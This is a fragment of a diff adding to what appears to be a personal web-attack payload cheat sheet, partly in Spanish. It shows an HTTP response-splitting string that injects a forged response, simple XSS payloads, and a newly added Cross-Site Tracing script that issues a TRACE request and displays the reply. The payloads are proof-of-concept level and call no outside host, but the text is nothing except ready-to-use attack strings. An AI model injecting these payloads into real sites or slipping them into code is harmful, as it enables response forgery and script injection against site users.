@@ -61,6 +61,9 @@ HTTP Split Attack ->
 			asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0ALast-Modified%3A%20Mon%2C%2011%20Feb%202019%2014%3A50%3A18%20GMT%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E
 			
 			
+XST ->
+	<script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'IP', false); xhr.send(null); if(200 == xhr.status)  alert(xhr.responseText);</script>
+
 
 XSS -> <script>alert("HOLA");</script>
         <iframe src=http://URL A MOSTRAR></script>
